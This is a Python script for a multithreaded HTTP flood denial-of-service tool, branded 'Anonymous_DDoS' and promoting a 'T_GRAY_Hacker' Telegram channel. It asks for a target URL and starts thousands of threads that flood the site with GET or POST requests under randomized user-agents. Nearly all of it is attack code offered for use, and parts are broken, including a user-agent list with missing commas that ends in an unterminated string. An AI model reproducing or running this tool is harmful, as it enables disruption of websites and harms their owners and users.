import requests
from urllib.parse import urlparse
import random
import time
import threading
import sys
from colorama import Style, Fore
from pystyle import Colorate, Colors,Write
class Dos:
    USER_AGENTS = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12D508 Safari/600.1.4" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36" "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/42.0 Safari/537.31" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36" "Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.2.2339 Mobile Safari/537.35+" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0" "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) QuickLook/5.0" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) l
    ]


    amount = 0
    USER_AGENT = ""

    def __init__(self, seq, type):
        self.seq = seq
        self.type = type

    def run(self):
        try:
            while True:
                if self.type == 1:
                    self.postAttack(Dos.url)
                elif self.type == 2:
                    self.sslPostAttack(Dos.url)
                elif self.type == 3:
                    self.getAttack(Dos.url)
                elif self.type == 4:
                    self.sslGetAttack(Dos.url)
        except Exception:
            pass

    @staticmethod
    def main():
        url = ""
        Dos.amount = 0
        dos = Dos(0, 0)
        url = input("""\x1b[38;2;0;255;189m|•|›››[TARGET] : \033[1;m""")
        

        parsed_url = urlparse(url)

        print(f"""\x1b[38;2;0;255;189m|•|›››[CHECKING TO {url} ] : \033[1;m""")
        if parsed_url.scheme == "http":
            dos.checkConnection(url)
        else:
            dos.sslCheckConnection(url)

        print("""\x1b[38;2;0;255;189mWellcome To SocketMethods: \033[1;m""")

        amount= input("""\x1b[38;2;0;255;189m|•|›››[THREADS] : \033[1;m""")
        if amount is None or amount == "":
            Dos.amount = 2000
        else:
            Dos.amount = int(amount)

        option = input("""\x1b[38;2;0;255;189m|•|›››[METHODS(get/http)] : \033[1;m""")
        ioption = 1
        if option.lower() == "get":
            if parsed_url.scheme == "http":
                ioption = 3
            else:
                ioption = 4
        else:
            if parsed_url.scheme == "http":
                ioption = 1
            else:
                ioption = 2

        time.sleep(1)

        print("""\x1b[38;2;0;255;189m|•|›››[Starting To Attack]\033[1;m""")
        threads = []
        for i in range(Dos.amount):
            t = threading.Thread(target=Dos(i, ioption).run)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print("Attack Error Because The Connect To Website Unavailable")

    def checkConnection(self, url):
        Write.Print(f"Checking Connection", Colors.yellow_to_green, interval=0.0002)
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            if response.status_code == 200:
                Write.Print(f"Successful connection!!!!", Colors.yellow_to_green, interval=0.0002)
            Dos.url = url
        except requests.exceptions.RequestException as e:
        	Write.Print(f"https://t.me/T_GRAY_Hacker tool Python\n", Colors.red, interval=0.0002)
        sys.exit()

    def sslCheckConnection(self, url):
        print("""\x1b[38;2;0;255;189m|•|›››[\x1b[38;2;224;0;255m Checking The Connect SSL ]\033[1;m""")
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            if response.status_code == 200:
                print(f"""\x1b[38;2;0;255;189m|•|›››[Anonymous_DDoS] : \033[1;m""")
            Dos.url = url
        except requests.exceptions.RequestException as e:
            Write.Print(f"Invalid Url Please Return The Panel\n", Colors.red, interval=0.0002)
            sys.exit()

    def postAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=False)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m {url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} ", Colors.red_to_green, interval=0.0002)

    def getAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n ", Colors.red_to_green, interval=0.0002)

    def sslPostAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=True)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n ", Colors.red_to_green, interval=0.0002)

    def sslGetAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n", Colors.red_to_green, interval=0.0002)


if __name__ == "__main__":
    Dos.main()
                
